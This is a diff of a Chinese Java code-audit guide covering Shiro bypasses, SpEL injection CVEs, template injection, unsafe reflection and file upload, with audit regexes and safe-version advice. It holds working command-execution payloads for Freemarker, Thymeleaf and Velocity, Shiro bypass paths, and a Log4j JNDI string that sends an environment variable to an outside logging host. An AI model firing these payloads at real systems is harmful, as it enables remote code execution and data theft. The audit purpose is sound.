@@ -62,7 +62,6 @@ org.apache.shiro.web.mgt.CookieRememberMeManager
 | CVE-2020-11989 | CVE-2020-1957补丁绕过  | Shiro < 1.5.3 | /;/admin/page              |
 | CVE-2020-13933 | CVE-2020-11989补丁绕过 | Shiro < 1.6.0 | /admin/%3bpage             |
 | CVE-2020-17523 | 权限绕过               | Shiro < 1.7.1 | /admin/%20  <br>/admin/%2e |
-
 shiro配置路径匿名访问的方法大概如下：
 
 1、集中配置
@@ -194,7 +193,169 @@ ${jndi:ldap://${env:OS}.61169aeb6f.ipv6.1433.eu.org}
 ![](/dmsj_img/Pasted%20image%2020241211154747.png)
 
 ![](/dmsj_img/Pasted%20image%2020241211154801.png)
-## 4、其他
+ ## 4、SpEL
+
+SpEL表达式注入，这个漏洞其实在网站开发者中的自编码中并不常见，更多是在spring家族的一些组件里面，这个简单来说就是将用户的输入带入SpEL表达式中执行了：
+
+单独代码审计关键词：
+
+```
+//关键类  
+org.springframework.expression.Expression  
+org.springframework.expression.ExpressionParser  
+org.springframework.expression.spel.standard.SpelExpressionParser  
+  
+//调用特征  
+ExpressionParser parser = new SpelExpressionParser();  
+Expression expression = parser.parseExpression(str);  
+expression.getValue()  
+expression.setValue()
+
+黑盒一般使用一些数字${3333-1}
+```
+
+一些著名的SpEL注入组件：
+
+```
+CVE-2016-4977 黑盒有概率遇到
+Spring Security OAuth 2.3到2.3.2
+Spring Security OAuth 2.2到2.2.1
+Spring Security OAuth 2.1到2.1.1
+Spring Security OAuth 2.0到2.0.14
+
+CVE-2017-4971
+Pivotal Spring_Web_Flow 2.4.0到2.4.4
+
+CVE-2017-8046
+Pivotal_Software Spring_Data_Rest < 2.6.9
+VMware Spring_Boot 2.0.0
+VMware Spring_Boot < 1.5.9
+Pivotal_Software Spring_Data_Rest 3.0.0
+
+CVE-2018-1270
+Spring Framework 5.0 to 5.0.4.
+Spring Framework 4.3 to 4.3.14
+
+CVE-2018-1273
+Spring Data Commons 1.13至1.13.10
+Spring Data REST 2.6至2.6.10
+Spring Data Commons 2.0至2.0.5
+Spring Data REST 3.0至3.0.5
+
+CVE-2022-22947 黑盒有大概率遇到
+Spring Cloud Gateway 3.1.0至3.1.1和3.0.0至3.0.6
+
+
+CVE-2022-22963 黑盒有大概率遇到
+org.springframework.cloud:spring-cloud-function-context
+（影响版本：3.0.0.RELEASE~3.2.2）
+
+CVE-2022-22965 这个不是SpEL表达式注入，但是影响范围比较大，作为审计来说有必要进行查看，黑盒有概率遇到
+Spring Framework 5.3.X < 5.3.18 
+Spring Framework 5.2.X < 5.2.20
+及其衍生产品
+JDK ≥ 9
+```
+
+上诉漏洞部分在黑盒中并不好使，容易被发现的以进行了备注，利用详情可查看另外一个文章，不容易被黑盒发现的作为审计来说也应该注意规避风险。
+
+## 5、模板注入
+
+JAVA中比较严重的SSTI模板注入主要发生在三个组件上：Freemarker、Velocity、Thymeleaf，因为它们允许直接调用底层 Java 方法：
+
+![](/dmsj_img/Pasted%20image%2020241220153128.png)
+
+### Freemarker：
+
+```
+Freemarker的漏洞在于用户可以修改模板，修改模板的方法目前有三个：一是通过stringLoader.putTemplate方法来把模板加载到内存中，二个是通过实例化Template类，三是通过其他方法直接修改对应的模板文件，在实战中多见于参数直接传递，或者直接修改模板文件。
+
+审计正则表达式：
+html可换成ftl
+return\(.*?\.html
+return\s*".*?\.html"
+render\(.*?\.html
+
+当一个Controller的方法没有返回值（即返回类型为`void`），并且使用了`@GetMapping`或`@PostMapping`等注解来处理HTTP请求时，Spring MVC会默认将请求的URL作为视图名称，并使用配置的模板引擎（如Thymeleaf）去渲染对应的模板。
+审计正则表达式：
+@GetMapping\(.*?\)\s*public\s+void/gm
+
+payload:
+
+new函数：
+<#assign value="freemarker.template.utility.Execute"?new()>${value("calc.exe")}
+
+<#assign value="freemarker.template.utility.ObjectConstructor"?new()>${value("java.lang.ProcessBuilder","calc.exe").start()}
+
+<#assign value="freemarker.template.utility.JythonRuntime"?new()><@value>import os;os.system("calc.exe")
+
+api函数：
+#assign classLoader=object?api.class.protectionDomain.classLoader> 
+<#assign clazz=classLoader.loadClass("ClassExposingGSON")> 
+<#assign field=clazz?api.getField("GSON")> 
+<#assign gson=field?api.get(null)> 
+<#assign ex=gson?api.fromJson("{}", classLoader.loadClass("freemarker.template.utility.Execute"))> 
+${ex("Calc"")}
+
+其中api的方法在2.3.22版本之后默认无法使用，new方法在2.3.30版本后也被做了一些限制，无法直接执行命令，但是仍然需要注意，所以建议至少版本在2.3.30版本后，同时无危险使用方法。
+```
+
+
+案例参考：
+https://github.com/pawelkaliniakit/springboot-freemarker-ssti/tree/master
+https://github.com/nth347/Java-SSTI-demo
+
+![](/dmsj_img/Pasted%20image%2020241222001709.png)
+
+![](/dmsj_img/Pasted%20image%2020241222001831.png)
+
+### Thymeleaf
+
+```
+比较常规的漏洞版本是：Thymeleaf 3.0.0 至 3.0.11，但是后续的漏洞版本修复存在一些绕过问题，建议至少大于3.0.15。
+
+和上一个模板注入的情况类似，我认为最常见的情况还是return或者render返回对应的前端文件。
+
+审计正则表达式：
+html可换成ftl
+return\(.*?\.html
+return\s*".*?\.html"
+render\(.*?\.html
+
+当一个Controller的方法没有返回值（即返回类型为`void`），并且使用了`@GetMapping`或`@PostMapping`等注解来处理HTTP请求时，Spring MVC会默认将请求的URL作为视图名称，并使用配置的模板引擎（如Thymeleaf）去渲染对应的模板。
+审计正则表达式：
+@GetMapping\(.*?\)\s*public\s+void/gm
+
+payload:
+
+__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%27calc.exe%27).getInputStream()).next()%7d__::.x
+```
+
+### Velocity
+
+```
+安全版本：Velocity大于2.2
+
+重点关注：
+org.apache.velocity.app.Velocity 的 evaluate 和 mergeTemplate 方法
+org.apache.velocity.app.VelocityEngine 的 evaluate 和 mergeTemplate 方法
+org.apache.velocity.runtime.RuntimeServices 的 evaluate 和 parse 方法
+org.apache.velocity.runtime.RuntimeSingleton 的 parse 方法
+org.apache.velocity.runtime.resource.util.StringResourceRepository 的 putStringResource 方法
+
+payload:
+#set ($exec = "kxlzx")$exec.class.forName("java.lang.Runtime").getRuntime().exec("calc")
+
+%23set($e="e");$e.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("calc")
+```
+
+![](/dmsj_img/Pasted%20image%2020241224151127.png)
+
+![](/dmsj_img/Pasted%20image%2020241224151144.png)
+
+
+
+## 6、其他
 
 ### XStream
 
@@ -438,71 +599,20 @@ zookeeper.connect-string=localhost:2181
 connect-string: localhost:2181
 ```
 
-## 5、SpEL
+### 不安全的反射
 
-SpEL表达式注入，这个漏洞其实在网站开发者中的自编码中并不常见，更多是在spring家族的一些组件里面，这个简单来说就是将用户的输入带入SpEL表达式中执行了：
-
-单独代码审计关键词：
+这个漏洞在实战中并不多见，但是有少量的案例，大多和RCE有关：
 
 ```
-//关键类  
-org.springframework.expression.Expression  
-org.springframework.expression.ExpressionParser  
-org.springframework.expression.spel.standard.SpelExpressionParser  
-  
-//调用特征  
-ExpressionParser parser = new SpelExpressionParser();  
-Expression expression = parser.parseExpression(str);  
-expression.getValue()  
-expression.setValue()
+关键类：
 
-黑盒一般使用一些数字${3333-1}
+java.lang.reflect.Method.invoke()
+java.lang.ClassLoader.loadClass()
+java.net.URLClassLoader.newInstance()
+org.codehaus.groovy.runtime.InvokerHelper.invokeMethod()
+
+这个漏洞具体得看相关代码和触发条件，大多还位于能直接调用类的功能点，寻找可用类是个比较麻烦的地方，不过从甲方视角来看，仍然是个需要修复的地方，建议做好限制。
 ```
-
-一些著名的SpEL注入组件：
-
-```
-CVE-2016-4977 黑盒有概率遇到
-Spring Security OAuth 2.3到2.3.2
-Spring Security OAuth 2.2到2.2.1
-Spring Security OAuth 2.1到2.1.1
-Spring Security OAuth 2.0到2.0.14
-
-CVE-2017-4971
-Pivotal Spring_Web_Flow 2.4.0到2.4.4
-
-CVE-2017-8046
-Pivotal_Software Spring_Data_Rest < 2.6.9
-VMware Spring_Boot 2.0.0
-VMware Spring_Boot < 1.5.9
-Pivotal_Software Spring_Data_Rest 3.0.0
-
-CVE-2018-1270
-Spring Framework 5.0 to 5.0.4.
-Spring Framework 4.3 to 4.3.14
-
-CVE-2018-1273
-Spring Data Commons 1.13至1.13.10
-Spring Data REST 2.6至2.6.10
-Spring Data Commons 2.0至2.0.5
-Spring Data REST 3.0至3.0.5
-
-CVE-2022-22947 黑盒有大概率遇到
-Spring Cloud Gateway 3.1.0至3.1.1和3.0.0至3.0.6
-
-
-CVE-2022-22963 黑盒有大概率遇到
-org.springframework.cloud:spring-cloud-function-context
-（影响版本：3.0.0.RELEASE~3.2.2）
-
-CVE-2022-22965 这个不是SpEL表达式注入，但是影响范围比较大，作为审计来说有必要进行查看，黑盒有概率遇到
-Spring Framework 5.3.X < 5.3.18 
-Spring Framework 5.2.X < 5.2.20
-及其衍生产品
-JDK ≥ 9
-```
-
-上诉漏洞部分在黑盒中并不好使，容易被发现的以进行了备注，利用详情可查看另外一个文章，不容易被黑盒发现的作为审计来说也应该注意规避风险。
 
 # 自编码漏洞
 
@@ -599,7 +709,7 @@ resopnse.getWriter()
 
 ## 3、文件上传
 
-文件上传在较近年的springboot项目中可能遇到JSP文件不解析的情况，因为springboot内置的tomcat服务器默认不支持tomcat-embed-jasper，但是不代表这个漏洞不重要，就算无法直接写webshell，但是如果java程序是以高权限启动的，配合目录穿越，可能导致写入密钥、计划任务、passwd等方式getshell。
+文件上传在较近年的springboot项目中可能遇到JSP文件不解析的情况，因为springboot内置的tomcat服务器默认不支持tomcat-embed-jasper，但是不代表这个漏洞不重要，就算无法直接写webshell，但是如果java程序是以高权限启动的，配合目录穿越，可能导致写入密钥、计划任务、passwd、如果能触发jar包的话，方法就更多了。
 
 关键词：
 
